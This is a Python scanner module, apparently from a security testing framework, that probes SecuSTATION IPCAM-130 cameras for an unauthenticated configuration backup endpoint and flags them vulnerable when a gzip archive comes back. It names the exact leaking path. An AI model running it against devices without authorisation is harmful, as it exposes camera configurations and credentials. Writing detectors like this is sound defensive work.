import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "secustation_ipcam130_disclosure/device_rsp_scan"
        self.description = "SecuSTATION IPCAM-130 Remote Configuration Backup Exposure Scanner."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        print("\033[1;36m[*] Running verification script: secustation_ipcam130_disclosure/device_rsp_scan...\033[0m")
        
        # Résolution de la chaîne hexadécimale obfusquée : /web/cgi-bin/hi3510/backup.cgi
        endpoint = "/web/cgi-bin/hi3510/backup.cgi"
        url = f"http://{target}:{port}{endpoint}" if not target.startswith(("http://", "https://")) else f"{target.rstrip('/')}{endpoint}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            async with httpx.AsyncClient(timeout=6.0, verify=False) as client:
                response = await client.get(url, headers=headers)
                
                # Validation basée sur le statut HTTP 200 et les octets magiques d'une archive Gzip (\x1f\x8b)
                if response.status_code == 200 and response.content.startswith(b'\x1f\x8b'):
                    return {
                        "vulnerable": True,
                        "details": "Target is VULNERABLE. Unauthenticated configuration backup archive is accessible."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
